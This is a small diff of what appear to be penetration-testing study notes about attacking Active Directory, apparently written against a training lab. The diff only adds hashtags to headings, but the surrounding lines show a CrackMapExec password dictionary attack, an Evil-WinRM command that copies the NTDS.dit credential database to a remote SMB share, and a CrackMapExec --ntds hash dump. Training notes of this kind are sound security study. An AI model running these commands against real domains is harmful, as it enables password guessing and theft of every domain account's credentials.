@@ -1,6 +1,6 @@
 #windows/auth/AD/NTDS
 
-# Dictionary Attacks against AD accounts using CrackMapExec
+# Dictionary Attacks against AD accounts using #CrackMapExec
 ```bash
 crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
  ```
@@ -39,7 +39,7 @@ Successfully created shadow copy for 'C:\'
 ```
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 ```
-# A Faster Method: Using crackmapexec to Capture NTDS.dit
+# A Faster Method: Using #CrackMapExec  to Capture NTDS.dit
 ```bash
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
